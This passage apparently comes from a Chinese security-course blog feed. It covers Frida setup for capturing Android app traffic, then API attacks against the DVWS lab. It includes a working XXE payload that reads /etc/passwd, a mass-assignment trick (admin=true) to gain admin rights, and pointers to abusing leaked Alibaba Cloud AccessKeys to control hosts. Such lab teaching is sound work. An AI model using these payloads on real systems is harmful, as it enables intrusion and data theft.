title="2、模拟器安装Frida"></a>2、模拟器安装Frida</h6><p>手机真机和模拟器安装不同版本</p><p><img src="/../images/Day67-APP%E6%94%BB%E9%98%B2-Frida%E5%8F%8D%E8%AF%81%E4%B9%A6%E6%8A%93%E5%8C%85-%E7%A7%BB%E5%8A%A8%E5%AE%89%E5%85%A8%E7%B3%BB%E7%BB%9F-%E8%B5%84%E4%BA%A7%E6%8F%90%E5%8F%96-%E8%AF%84%E4%BC%B0%E6%89%AB%E6%8F%8F/image-20230317001230750.png" alt="image-20230317001230750"></p><p>注意：版本要与本地Frida一致</p><p>下载：<a href="https://github.com/frida/frida/releases">https://github.com/frida/frida/releases</a></p><p>真机：ARM版本及位数 模拟器：无ARM的位数</p><p>getprop ro.product.cpu.abi</p><p><img src="/../images/Day67-APP%E6%94%BB%E9%98%B2-Frida%E5%8F%8D%E8%AF%81%E4%B9%A6%E6%8A%93%E5%8C%85-%E7%A7%BB%E5%8A%A8%E5%AE%89%E5%85%A8%E7%B3%BB%E7%BB%9F-%E8%B5%84%E4%BA%A7%E6%8F%90%E5%8F%96-%E8%AF%84%E4%BC%B0%E6%89%AB%E6%8F%8F/image-20230317001500132.png" alt="image-20230317001500132"></p><p>复制此文件</p><p><img src="/../images/Day67-APP%E6%94%BB%E9%98%B2-Frida%E5%8F%8D%E8%AF%81%E4%B9%A6%E6%8A%93%E5%8C%85-%E7%A7%BB%E5%8A%A8%E5%AE%89%E5%85%A8%E7%B3%BB%E7%BB%9F-%E8%B5%84%E4%BA%A7%E6%8F%90%E5%8F%96-%E8%AF%84%E4%BC%B0%E6%89%AB%E6%8F%8F/image-20230317002158327.png" alt="image-20230317002158327"></p><p>粘贴到Nox&#x2F;bin下面</p><p><img src="/../images/Day67-APP%E6%94%BB%E9%98%B2-Frida%E5%8F%8D%E8%AF%81%E4%B9%A6%E6%8A%93%E5%8C%85-%E7%A7%BB%E5%8A%A8%E5%AE%89%E5%85%A8%E7%B3%BB%E7%BB%9F-%E8%B5%84%E4%BA%A7%E6%8F%90%E5%8F%96-%E8%AF%84%E4%BC%B0%E6%89%AB%E6%8F%8F/image-20230317002340780.png" alt="image-20230317002340780"></p><p>在Nox&#x2F;bin下执行命令：adb push frida-server &#x2F;data&#x2F;local  [要命名的文件]</p><p><img src="/../images/Day67-APP%E6%94%BB%E9%98%B2-Frida%E5%8F%8D%E8%AF%81%E4%B9%A6%E6%8A%93%E5%8C%85-%E7%A7%BB%E5%8A%A8%E5%AE%89%E5%85%A8%E7%B3%BB%E7%BB%9F-%E8%B5%84%E4%BA%A7%E6%8F%90%E5%8F%96-%E8%AF%84%E4%BC%B0%E6%89%AB%E6%8F%8F/image-20230317002505301.png" alt="image-20230317002505301"></p><p>adb shell</p><p>cd &#x2F;data&#x2F;local&#x2F;tmp&#x2F;</p><p>chmod 777 frida-server</p><p>.&#x2F;frida-server</p><p><img src="/../images/Day67-APP%E6%94%BB%E9%98%B2-Frida%E5%8F%8D%E8%AF%81%E4%B9%A6%E6%8A%93%E5%8C%85-%E7%A7%BB%E5%8A%A8%E5%AE%89%E5%85%A8%E7%B3%BB%E7%BB%9F-%E8%B5%84%E4%BA%A7%E6%8F%90%E5%8F%96-%E8%AF%84%E4%BC%B0%E6%89%AB%E6%8F%8F/image-20230317002928997.png" alt="image-20230317002928997"></p><p>ps | grep frida 查看进程文件运行成功</p><p><img src="/../images/Day67-APP%E6%94%BB%E9%98%B2-Frida%E5%8F%8D%E8%AF%81%E4%B9%A6%E6%8A%93%E5%8C%85-%E7%A7%BB%E5%8A%A8%E5%AE%89%E5%85%A8%E7%B3%BB%E7%BB%9F-%E8%B5%84%E4%BA%A7%E6%8F%90%E5%8F%96-%E8%AF%84%E4%BC%B0%E6%89%AB%E6%8F%8F/image-20230317003014351.png" alt="image-20230317003014351"></p><h6 id="3、转发并启动Frida"><a href="#3、转发并启动Frida" class="headerlink" title="3、转发并启动Frida"></a>3、转发并启动Frida</h6><p>连接判断：frida-ps -U   frida-ps -R</p><p>frida-ps -U 检测是否连接了模拟器，有信息说明连接成功</p><p><img src="/../images/Day67-APP%E6%94%BB%E9%98%B2-Frida%E5%8F%8D%E8%AF%81%E4%B9%A6%E6%8A%93%E5%8C%85-%E7%A7%BB%E5%8A%A8%E5%AE%89%E5%85%A8%E7%B3%BB%E7%BB%9F-%E8%B5%84%E4%BA%A7%E6%8F%90%E5%8F%96-%E8%AF%84%E4%BC%B0%E6%89%AB%E6%8F%8F/image-20230317003124387.png" alt="image-20230317003124387"></p><p>但是此命令不成功</p><p><img src="/../images/Day67-APP%E6%94%BB%E9%98%B2-Frida%E5%8F%8D%E8%AF%81%E4%B9%A6%E6%8A%93%E5%8C%85-%E7%A7%BB%E5%8A%A8%E5%AE%89%E5%85%A8%E7%B3%BB%E7%BB%9F-%E8%B5%84%E4%BA%A7%E6%8F%90%E5%8F%96-%E8%AF%84%E4%BC%B0%E6%89%AB%E6%8F%8F/image-20230317003307811.png" alt="image-20230317003307811"></p><p>adb forward tcp:27042 tcp:27042 （那就转发端口）</p><p><img src="/../images/Day67-APP%E6%94%BB%E9%98%B2-Frida%E5%8F%8D%E8%AF%81%E4%B9%A6%E6%8A%93%E5%8C%85-%E7%A7%BB%E5%8A%A8%E5%AE%89%E5%85%A8%E7%B3%BB%E7%BB%9F-%E8%B5%84%E4%BA%A7%E6%8F%90%E5%8F%96-%E8%AF%84%E4%BC%B0%E6%89%AB%E6%8F%8F/image-20230317003419079.png" alt="image-20230317003419079"></p><p>再次输入frida-ps -R成功</p><p><img src="/../images/Day67-APP%E6%94%BB%E9%98%B2-Frida%E5%8F%8D%E8%AF%81%E4%B9%A6%E6%8A%93%E5%8C%85-%E7%A7%BB%E5%8A%A8%E5%AE%89%E5%85%A8%E7%B3%BB%E7%BB%9F-%E8%B5%84%E4%BA%A7%E6%8F%90%E5%8F%96-%E8%AF%84%E4%BC%B0%E6%89%AB%E6%8F%8F/image-20230317003507809.png" alt="image-20230317003507809"></p><p>模拟器打开贵妃前</p><p><img src="/../images/Day67-APP%E6%94%BB%E9%98%B2-Frida%E5%8F%8D%E8%AF%81%E4%B9%A6%E6%8A%93%E5%8C%85-%E7%A7%BB%E5%8A%A8%E5%AE%89%E5%85%A8%E7%B3%BB%E7%BB%9F-%E8%B5%84%E4%BA%A7%E6%8F%90%E5%8F%96-%E8%AF%84%E4%BC%B0%E6%89%AB%E6%8F%8F/image-20230317003712826.png" alt="image-20230317003712826"></p><p>打开后再执行frida-ps -R重新查看下进程，到此说明环境配置成功</p><p><img src="/../images/Day67-APP%E6%94%BB%E9%98%B2-Frida%E5%8F%8D%E8%AF%81%E4%B9%A6%E6%8A%93%E5%8C%85-%E7%A7%BB%E5%8A%A8%E5%AE%89%E5%85%A8%E7%B3%BB%E7%BB%9F-%E8%B5%84%E4%BA%A7%E6%8F%90%E5%8F%96-%E8%AF%84%E4%BC%B0%E6%89%AB%E6%8F%8F/image-20230317003803925.png" alt="image-20230317003803925"></p><h6 id="4、获取包名并运行抓包"><a href="#4、获取包名并运行抓包" class="headerlink" title="4、获取包名并运行抓包"></a>4、获取包名并运行抓包</h6><p>获取包名：ls &#x2F;data&#x2F;data 或 Apk Messenger</p><p>方法一：ls &#x2F;data&#x2F;data查看，也可以打卡模拟器文件查看，但是只能看见包名不能看见对应的软件名</p><p>方法二：利用Apk Messenger，可以看见软件名</p><p><img src="/../images/Day67-APP%E6%94%BB%E9%98%B2-Frida%E5%8F%8D%E8%AF%81%E4%B9%A6%E6%8A%93%E5%8C%85-%E7%A7%BB%E5%8A%A8%E5%AE%89%E5%85%A8%E7%B3%BB%E7%BB%9F-%E8%B5%84%E4%BA%A7%E6%8F%90%E5%8F%96-%E8%AF%84%E4%BC%B0%E6%89%AB%E6%8F%8F/image-20230317004039332.png" alt="image-20230317004039332"></p><p>python r0capture.py -U -f 包名 -p xxxx.pcap （保存为pcap格式数据包，这样其他协议的数据包也能抓到）</p><p><img src="/../images/Day67-APP%E6%94%BB%E9%98%B2-Frida%E5%8F%8D%E8%AF%81%E4%B9%A6%E6%8A%93%E5%8C%85-%E7%A7%BB%E5%8A%A8%E5%AE%89%E5%85%A8%E7%B3%BB%E7%BB%9F-%E8%B5%84%E4%BA%A7%E6%8F%90%E5%8F%96-%E8%AF%84%E4%BC%B0%E6%89%AB%E6%8F%8F/image-20230317004554411.png" alt="image-20230317004554411"></p><p>运行后模拟器 自动打开指定应用开始抓包</p><p><img src="/../images/Day67-APP%E6%94%BB%E9%98%B2-Frida%E5%8F%8D%E8%AF%81%E4%B9%A6%E6%8A%93%E5%8C%85-%E7%A7%BB%E5%8A%A8%E5%AE%89%E5%85%A8%E7%B3%BB%E7%BB%9F-%E8%B5%84%E4%BA%A7%E6%8F%90%E5%8F%96-%E8%AF%84%E4%BC%B0%E6%89%AB%E6%8F%8F/image-20230317004638833.png" alt="image-20230317004638833"></p><p>用wireshark打开这个生成的文件</p><p><img src="/../images/Day67-APP%E6%94%BB%E9%98%B2-Frida%E5%8F%8D%E8%AF%81%E4%B9%A6%E6%8A%93%E5%8C%85-%E7%A7%BB%E5%8A%A8%E5%AE%89%E5%85%A8%E7%B3%BB%E7%BB%9F-%E8%B5%84%E4%BA%A7%E6%8F%90%E5%8F%96-%E8%AF%84%E4%BC%B0%E6%89%AB%E6%8F%8F/image-20230317004914143.png" alt="image-20230317004914143"></p><p>发现可以抓到所有协议</p><p><img src="/../images/Day67-APP%E6%94%BB%E9%98%B2-Frida%E5%8F%8D%E8%AF%81%E4%B9%A6%E6%8A%93%E5%8C%85-%E7%A7%BB%E5%8A%A8%E5%AE%89%E5%85%A8%E7%B3%BB%E7%BB%9F-%E8%B5%84%E4%BA%A7%E6%8F%90%E5%8F%96-%E8%AF%84%E4%BC%B0%E6%89%AB%E6%8F%8F/image-20230317005024153.png" alt="image-20230317005024153"></p><p>而burpsuite只能抓到一个</p><p><img src="/../images/Day67-APP%E6%94%BB%E9%98%B2-Frida%E5%8F%8D%E8%AF%81%E4%B9%A6%E6%8A%93%E5%8C%85-%E7%A7%BB%E5%8A%A8%E5%AE%89%E5%85%A8%E7%B3%BB%E7%BB%9F-%E8%B5%84%E4%BA%A7%E6%8F%90%E5%8F%96-%E8%AF%84%E4%BC%B0%E6%89%AB%E6%8F%8F/image-20230317005109746.png" alt="image-20230317005109746"></p><p>如果抓到的不是web协议http&#x2F;https，其他协议上的ip也可以进行扫描是否有web上的端口</p>]]></content>
      
      
      <categories>
          
          <category> APP攻防 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Day66 API攻防-接口安全&amp;阿里云KEY&amp;Postman&amp;XXE&amp;DVWS&amp;鉴权&amp;泄漏</title>
      <link href="/2023/03/15/Day66-API%E6%94%BB%E9%98%B2-%E6%8E%A5%E5%8F%A3%E5%AE%89%E5%85%A8-%E9%98%BF%E9%87%8C%E4%BA%91KEY-Postman-XXE-DVWS-%E9%89%B4%E6%9D%83-%E6%B3%84%E6%BC%8F/"/>
      <url>/2023/03/15/Day66-API%E6%94%BB%E9%98%B2-%E6%8E%A5%E5%8F%A3%E5%AE%89%E5%85%A8-%E9%98%BF%E9%87%8C%E4%BA%91KEY-Postman-XXE-DVWS-%E9%89%B4%E6%9D%83-%E6%B3%84%E6%BC%8F/</url>
      
        <content type="html"><![CDATA[<h3 id="知识点："><a href="#知识点：" class="headerlink" title="#知识点："></a>#知识点：</h3><p>1.HTTP类接口-测评</p><p>2.RPC类接口-测评</p><p>3.Web Service类-测评</p><h3 id="内容点："><a href="#内容点：" class="headerlink" title="#内容点："></a>#内容点：</h3><p>SOAP（Simple Object Access Protocol）简单对象访问协议是交换数据的一种协议规范，是一种轻量的、简单的、基于XML（标准通用标记语言下的一个子集）的协议，它被设计成在WEB上交换结构化的和固化的信息。SOAP不是Web Service的专有协议。</p><p>SOAP使用HTTP来发送XML格式的数据，可以简单理解为：SOAP &#x3D; HTTP +XML</p><p>REST（Representational State Transfer）即表述性状态传递，在三种主流的Web服务实现方案中，因为REST模式的Web服务与复杂的SOAP和XML-RPC对比来讲明显的更加简洁，越来越多的Web服务开始采用REST风格设计和实现。例如，Amazon.com提供接近REST风格的Web服务进行图书查找；雅虎提供的Web服务也是REST风格的。</p><p>WSDL（Web Services Description Language）即网络服务描述语言，用于描述Web服务的公共接口。这是一个基于XML的关于如何与Web服务通讯和使用的服务描述；也就是描述与目录中列出的Web服务进行交互时需要绑定的协议和信息格式。通常采用抽象语言描述该服务支持的操作和信息，使用的时候再将实际的网络协议和信息格式绑定给该服务。</p><h3 id="接口数据包："><a href="#接口数据包：" class="headerlink" title="#接口数据包："></a>#接口数据包：</h3><h5 id="Method：请求方法"><a href="#Method：请求方法" class="headerlink" title="Method：请求方法"></a>Method：请求方法</h5><p> 攻击方式：OPTIONS,PUT,MOVE,DELETE</p><p> 效果：上传恶意文件，修改页面等</p><h5 id="URL：唯一资源定位符"><a href="#URL：唯一资源定位符" class="headerlink" title="URL：唯一资源定位符"></a>URL：唯一资源定位符</h5><p> 攻击方式：猜测，遍历，跳转</p><p> 效果：未授权访问等</p><h5 id="Params：请求参数"><a href="#Params：请求参数" class="headerlink" title="Params：请求参数"></a>Params：请求参数</h5><p> 攻击方式：构造参数，修改参数，遍历，重发</p><p> 效果：爆破，越权，未授权访问，突破业务逻辑等</p><h5 id="Authorization：认证方式"><a href="#Authorization：认证方式" class="headerlink" title="Authorization：认证方式"></a>Authorization：认证方式</h5><p> 攻击方式：身份伪造，身份篡改</p><p> 效果：越权，未授权访问等</p><h5 id="Headers：请求消息头"><a href="#Headers：请求消息头" class="headerlink" title="Headers：请求消息头"></a>Headers：请求消息头</h5><p> 攻击方式：拦截数据包，改Hosts，改Referer，改Content-Type等</p><p> 效果：绕过身份认证，绕过Referer验证，绕过类型验证，DDOS等</p><h5 id="Body：消息体"><a href="#Body：消息体" class="headerlink" title="Body：消息体"></a>Body：消息体</h5><p> 攻击方式：SQL注入，XML注入，反序列化等</p><p> 效果：提权，突破业务逻辑，未授权访问等</p><h3 id="安全问题："><a href="#安全问题：" class="headerlink" title="#安全问题："></a>#安全问题：</h3><p>XSS跨站，信息泄露，暴力破解，文件上传，未授权访问，JWT授权认证，接口滥用等</p><h3 id="演示案例："><a href="#演示案例：" class="headerlink" title="演示案例："></a>演示案例：</h3><p>➢ 工具使用-Postman自动化测试</p><p>➢ 安全问题-Dvws泄漏&amp;鉴权&amp;XXE</p><p>➢ 安全问题-阿里KEY信息泄漏利用</p><p>➢ 应用方向-违法APP打包接口分析</p><h4 id="工具使用-Postman自动化测试（测试API接口神器）"><a href="#工具使用-Postman自动化测试（测试API接口神器）" class="headerlink" title="#工具使用-Postman自动化测试（测试API接口神器）"></a>#工具使用-Postman自动化测试（测试API接口神器）</h4><p>下载地址：<a href="https://www.postman.com/downloads/">https://www.postman.com/downloads/</a></p><p>类似burpsuite</p><p>使用教程：</p><p>(<a href="https://blog.csdn.net/qq_41099091/article/details/107319193">https://blog.csdn.net/qq_41099091/article/details/107319193</a>)</p><p>(<a href="https://blog.csdn.net/hong521520/article/details/106614593">https://blog.csdn.net/hong521520/article/details/106614593</a>)</p><p><img src="/../images/Day66-API%E6%94%BB%E9%98%B2-%E6%8E%A5%E5%8F%A3%E5%AE%89%E5%85%A8-%E9%98%BF%E9%87%8C%E4%BA%91KEY-Postman-XXE-DVWS-%E9%89%B4%E6%9D%83-%E6%B3%84%E6%BC%8F/image-20230316151030455.png" alt="image-20230316151030455"></p><p>这里可以将某个变量的值设置为全局通用如：token</p><p><img src="/../images/Day66-API%E6%94%BB%E9%98%B2-%E6%8E%A5%E5%8F%A3%E5%AE%89%E5%85%A8-%E9%98%BF%E9%87%8C%E4%BA%91KEY-Postman-XXE-DVWS-%E9%89%B4%E6%9D%83-%E6%B3%84%E6%BC%8F/image-20230316152228199.png" alt="image-20230316152228199"></p><p>还可以上传文件</p><p><img src="/../images/Day66-API%E6%94%BB%E9%98%B2-%E6%8E%A5%E5%8F%A3%E5%AE%89%E5%85%A8-%E9%98%BF%E9%87%8C%E4%BA%91KEY-Postman-XXE-DVWS-%E9%89%B4%E6%9D%83-%E6%B3%84%E6%BC%8F/image-20230316152412691.png" alt="image-20230316152412691"></p><h4 id="安全问题-Dvws泄漏-amp-鉴权-amp-XXE"><a href="#安全问题-Dvws泄漏-amp-鉴权-amp-XXE" class="headerlink" title="#安全问题-Dvws泄漏&amp;鉴权&amp;XXE"></a>#安全问题-Dvws泄漏&amp;鉴权&amp;XXE</h4><p>靶场：<a href="https://github.com/snoopysecurity/dvws-node">https://github.com/snoopysecurity/dvws-node</a></p><p>遍历数据 接口数据</p><p>鉴权安全 越权判定</p><p>越权：</p><p>观察注册后，返回数据包</p><p>修改注册时，数据包admin&#x3D;true</p><p>JWT安全：</p><p><img src="/../images/Day66-API%E6%94%BB%E9%98%B2-%E6%8E%A5%E5%8F%A3%E5%AE%89%E5%85%A8-%E9%98%BF%E9%87%8C%E4%BA%91KEY-Postman-XXE-DVWS-%E9%89%B4%E6%9D%83-%E6%B3%84%E6%BC%8F/image-20230316151604986.png" alt="image-20230316151604986"></p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">XXE安全 </span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">Mikasa</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="keyword">test</span> <span class="keyword">SYSTEM</span>  <span class="string">&quot;file:///etc/passwd&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">soapenv:Envelope</span> <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span> <span class="attr">xmlns:xsd</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema&quot;</span> <span class="attr">xmlns:soapenv</span>=<span class="string">&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;</span> <span class="attr">xmlns:urn</span>=<span class="string">&quot;urn:examples:usernameservice&quot;</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">soapenv:Header</span>/&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">soapenv:Body</span>&gt;</span></span><br><span class="line">​      <span class="tag">&lt;<span class="name">urn:Username</span> <span class="attr">soapenv:encodingStyle</span>=<span class="string">&quot;http://schemas.xmlsoap.org/soap/encoding/&quot;</span>&gt;</span></span><br><span class="line">​         <span class="tag">&lt;<span class="name">username</span> <span class="attr">xsi:type</span>=<span class="string">&quot;xsd:string&quot;</span>&gt;</span><span class="symbol">&amp;test;</span><span class="tag">&lt;/<span class="name">username</span>&gt;</span></span><br><span class="line">​      <span class="tag">&lt;/<span class="name">urn:Username</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">soapenv:Body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">soapenv:Envelope</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h5 id="复现过程："><a href="#复现过程：" class="headerlink" title="复现过程："></a>复现过程：</h5><p>登陆时发现response中判断不是admin</p><p><img src="/../images/Day66-API%E6%94%BB%E9%98%B2-%E6%8E%A5%E5%8F%A3%E5%AE%89%E5%85%A8-%E9%98%BF%E9%87%8C%E4%BA%91KEY-Postman-XXE-DVWS-%E9%89%B4%E6%9D%83-%E6%B3%84%E6%BC%8F/image-20230316145640404.png" alt="image-20230316145640404"></p><p>重新注册个账号</p><p><img src="/../images/Day66-API%E6%94%BB%E9%98%B2-%E6%8E%A5%E5%8F%A3%E5%AE%89%E5%85%A8-%E9%98%BF%E9%87%8C%E4%BA%91KEY-Postman-XXE-DVWS-%E9%89%B4%E6%9D%83-%E6%B3%84%E6%BC%8F/image-20230316145827019.png" alt="image-20230316145827019"></p><p>发送数据包查看回显</p><p><img src="/../images/Day66-API%E6%94%BB%E9%98%B2-%E6%8E%A5%E5%8F%A3%E5%AE%89%E5%85%A8-%E9%98%BF%E9%87%8C%E4%BA%91KEY-Postman-XXE-DVWS-%E9%89%B4%E6%9D%83-%E6%B3%84%E6%BC%8F/image-20230316150034440.png" alt="image-20230316150034440"></p><p>更改用户名和密码并添加参数admin</p><p><img src="/../images/Day66-API%E6%94%BB%E9%98%B2-%E6%8E%A5%E5%8F%A3%E5%AE%89%E5%85%A8-%E9%98%BF%E9%87%8C%E4%BA%91KEY-Postman-XXE-DVWS-%E9%89%B4%E6%9D%83-%E6%B3%84%E6%BC%8F/image-20230316150157322.png" alt="image-20230316150157322"></p><p>用这个账号密码登录，回显是admin身份</p><p><img src="/../images/Day66-API%E6%94%BB%E9%98%B2-%E6%8E%A5%E5%8F%A3%E5%AE%89%E5%85%A8-%E9%98%BF%E9%87%8C%E4%BA%91KEY-Postman-XXE-DVWS-%E9%89%B4%E6%9D%83-%E6%B3%84%E6%BC%8F/image-20230316150302069.png" alt="image-20230316150302069"></p><p>在dvwsuserservice功能处抓包，额外添加自己写的xml代码，注意语法里面函数要对应上，如果无回显则先测试有无漏洞，结合dnslog，有的话带外测试</p><p><img src="/../images/Day66-API%E6%94%BB%E9%98%B2-%E6%8E%A5%E5%8F%A3%E5%AE%89%E5%85%A8-%E9%98%BF%E9%87%8C%E4%BA%91KEY-Postman-XXE-DVWS-%E9%89%B4%E6%9D%83-%E6%B3%84%E6%BC%8F/image-20230316150804256.png" alt="image-20230316150804256"></p><h4 id="安全问题-阿里KEY信息泄漏利用"><a href="#安全问题-阿里KEY信息泄漏利用" class="headerlink" title="#安全问题-阿里KEY信息泄漏利用"></a>#安全问题-阿里KEY信息泄漏利用</h4><p>行云管家：<a href="https://yun.cloudbility.com/%E5%BE%97%E5%88%B0key%E5%90%8E%E5%86%8D%E8%BF%99%E9%87%8C%E5%A1%AB%E5%86%99%E5%B0%B1%E5%8F%AF%E4%BB%A5%E4%B8%8A%E7%BA%BF">https://yun.cloudbility.com/得到key后再这里填写就可以上线</a></p><p><a href="https://www.freebuf.com/articles/web/255717.html">记一次阿里云主机泄露Access Key到Getshell - FreeBuf网络安全行业门户</a></p><p>工具：<a href="https://github.com/mrknow001/aliyun-accesskey-Tools">https://github.com/mrknow001/aliyun-accesskey-Tools</a></p><p>接口配置文件泄漏导致云资源主机受控</p><h4 id="应用方向-违法APP打包接口分析"><a href="#应用方向-违法APP打包接口分析" class="headerlink" title="#应用方向-违法APP打包接口分析"></a>#应用方向-违法APP打包接口分析</h4><h5 id="完整的分析流程"><a href="#完整的分析流程" class="headerlink" title="完整的分析流程"></a>完整的分析流程</h5><p>插件检测到有webpack</p><p><img src="/../images/Day66-API%E6%94%BB%E9%98%B2-%E6%8E%A5%E5%8F%A3%E5%AE%89%E5%85%A8-%E9%98%BF%E9%87%8C%E4%BA%91KEY-Postman-XXE-DVWS-%E9%89%B4%E6%9D%83-%E6%B3%84%E6%BC%8F/image-20230316152851768.png" alt="image-20230316152851768"></p><p>用脚本扫描js文件</p><p><img src="/../images/Day66-API%E6%94%BB%E9%98%B2-%E6%8E%A5%E5%8F%A3%E5%AE%89%E5%85%A8-%E9%98%BF%E9%87%8C%E4%BA%91KEY-Postman-XXE-DVWS-%E9%89%B4%E6%9D%83-%E6%B3%84%E6%BC%8F/image-20230316153025375.png" alt="image-20230316153025375"></p><p>在客服处可以尝试文件上传漏洞</p><p><img src="/../images/Day66-API%E6%94%BB%E9%98%B2-%E6%8E%A5%E5%8F%A3%E5%AE%89%E5%85%A8-%E9%98%BF%E9%87%8C%E4%BA%91KEY-Postman-XXE-DVWS-%E9%89%B4%E6%9D%83-%E6%B3%84%E6%BC%8F/image-20230316153439521.png" alt="image-20230316153439521"></p>]]></content>
      
      
      <categories>
          
          <category> API攻防 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Day65 API攻防-接口安全&amp;WebPack&amp;REST&amp;SOAP&amp;WSDL&amp;WebService</title>
      <link href="/2023/03/15/Day65-API%E6%94%BB%E9%98%B2-%E6%8E%A5%E5%8F%A3%E5%AE%89%E5%85%A8-WebPack-REST-SOAP-WSDL-WebService/"/>
      <url>/2023/03/15/Day65-API%E6%94%BB%E9%98%B2-%E6%8E%A5%E5%8F%A3%E5%AE%89%E5%85%A8-WebPack-REST-SOAP-WSDL-WebService/</url>
      
        <content type="html"><![CDATA[<h3 id="知识点："><a href="#知识点：" class="headerlink" title="#知识点："></a>#知识点：</h3><p>1.HTTP类接口-测评</p><p>2.RPC类接口-测评</p><p>3.Web Service类-测评</p><h3 id="内容点："><a href="#内容点：" class="headerlink" title="#内容点："></a>#内容点：</h3><p>SOAP（Simple Object Access Protocol）简单对象访问协议是交换数据的一种协议规范，是一种轻量的、简单的、基于XML（标准通用标记语言下的一个子集）的协议，它被设计成在WEB上交换结构化的和固化的信息。SOAP不是Web Service的专有协议。</p><p>SOAP使用HTTP来发送XML格式的数据，可以简单理解为：SOAP &#x3D; HTTP +XML</p><p>REST（Representational State Transfer）即表述性状态传递，在三种主流的Web服务实现方案中，因为REST模式的Web服务与复杂的SOAP和XML-RPC对比来讲明显的更加简洁，越来越多的Web服务开始采用REST风格设计和实现。例如，Amazon.com提供接近REST风格的Web服务进行图书查找；雅虎提供的Web服务也是REST风格的。</p><p>WSDL（Web Services Description Language）即网络服务描述语言，用于描述Web服务的公共接口。这是一个基于XML的关于如何与Web服务通讯和使用的服务描述；也就是描述与目录中列出的Web服务进行交互时需要绑定的协议和信息格式。通常采用抽象语言描述该服务支持的操作和信息，使用的时候再将实际的网络协议和信息格式绑定给该服务。</p><h3 id="接口数据包："><a href="#接口数据包：" class="headerlink" title="#接口数据包："></a>#接口数据包：</h3><h5 id="Method：请求方法"><a href="#Method：请求方法" class="headerlink" title="Method：请求方法"></a>Method：请求方法</h5><p> 攻击方式：OPTIONS,PUT,MOVE,DELETE</p><p> 效果：上传恶意文件，修改页面等</p><h5 id="URL：唯一资源定位符"><a href="#URL：唯一资源定位符" class="headerlink" title="URL：唯一资源定位符"></a>URL：唯一资源定位符</h5><p> 攻击方式：猜测，遍历，跳转</p><p> 效果：未授权访问等</p><h5 id="Params：请求参数"><a href="#Params：请求参数" class="headerlink" title="Params：请求参数"></a>Params：请求参数</h5><p> 攻击方式：构造参数，修改参数，遍历，重发</p><p> 效果：爆破，越权，未授权访问，突破业务逻辑等</p><h5 id="Authorization：认证方式"><a href="#Authorization：认证方式" class="headerlink" title="Authorization：认证方式"></a>Authorization：认证方式</h5><p> 攻击方式：身份伪造，身份篡改</p><p> 效果：越权，未授权访问等</p><h5 id="Headers：请求消息头"><a href="#Headers：请求消息头" class="headerlink" title="Headers：请求消息头"></a>Headers：请求消息头</h5><p> 攻击方式：拦截数据包，改Hosts，改Referer，改Content-Type等</p><p> 效果：绕过身份认证，绕过Referer验证，绕过类型验证，DDOS等</p><h5 id="Body：消息体"><a href="#Body：消息体" class="headerlink" title="Body：消息体"></a>Body：消息体</h5><p> 攻击方式：SQL注入，XML注入，反序列化等</p><p> 效果：提权，突破业务逻辑，未授权访问等</p><h3 id="安全问题："><a href="#安全问题：" class="headerlink" title="#安全问题："></a>#安全问题：</h3><p>XSS跨站，信息泄露，暴力破解，文件上传，未授权访问，JWT授权认证，接口滥用等</p><h3 id="演示案例："><a href="#演示案例：" class="headerlink" title="演示案例："></a>演示案例：</h3><p>➢ WebService类-Wsdl&amp;ReadyAPI-SQL注入</p><p>➢ SOAP类-Swagger&amp;SoapUI&amp;EXP-信息泄露</p><p>➢ HTTP类-WebPack&amp;PackerFuzzer-信息泄露</p><h4 id="WebService类-Wsdl-amp-SoapUI"><a href="#WebService类-Wsdl-amp-SoapUI" class="headerlink" title="#WebService类-Wsdl&amp;SoapUI"></a>#WebService类-Wsdl&amp;SoapUI</h4><p>探针：?wsdl</p><p>利用：SoapUI&amp;ReadyAPI</p><p>如果存在wsdl接口就可以尝试进行测试，要配合数据提交测试</p><p><img src="/../images/Day65-API%E6%94%BB%E9%98%B2-%E6%8E%A5%E5%8F%A3%E5%AE%89%E5%85%A8-WebPack-REST-SOAP-WSDL-WebService/image-20230315232904090.png" alt="image-20230315232904090"></p><p>在网址后面输入?wsdl将会展示接口信息</p><p><img src="/../images/Day65-API%E6%94%BB%E9%98%B2-%E6%8E%A5%E5%8F%A3%E5%AE%89%E5%85%A8-WebPack-REST-SOAP-WSDL-WebService/image-20230315231922317.png" alt="image-20230315231922317"></p><p>接口：</p><p><img src="/../images/Day65-API%E6%94%BB%E9%98%B2-%E6%8E%A5%E5%8F%A3%E5%AE%89%E5%85%A8-WebPack-REST-SOAP-WSDL-WebService/image-20230315232030194.png" alt="image-20230315232030194"></p><p>输入网址，SoapUI自动解析里面的所有请求方法</p><p><img src="/../images/Day65-API%E6%94%BB%E9%98%B2-%E6%8E%A5%E5%8F%A3%E5%AE%89%E5%85%A8-WebPack-REST-SOAP-WSDL-WebService/image-20230315232205933.png" alt="image-20230315232205933"></p><p>ReadyAPI(收费)探针接口并请求payload,检测api接口的漏洞</p><p><img src="/../images/Day65-API%E6%94%BB%E9%98%B2-%E6%8E%A5%E5%8F%A3%E5%AE%89%E5%85%A8-WebPack-REST-SOAP-WSDL-WebService/image-20230315232430324.png" alt="image-20230315232430324"></p><h4 id="SOAP类-Swagger-amp-SoapUI-amp-EXP"><a href="#SOAP类-Swagger-amp-SoapUI-amp-EXP" class="headerlink" 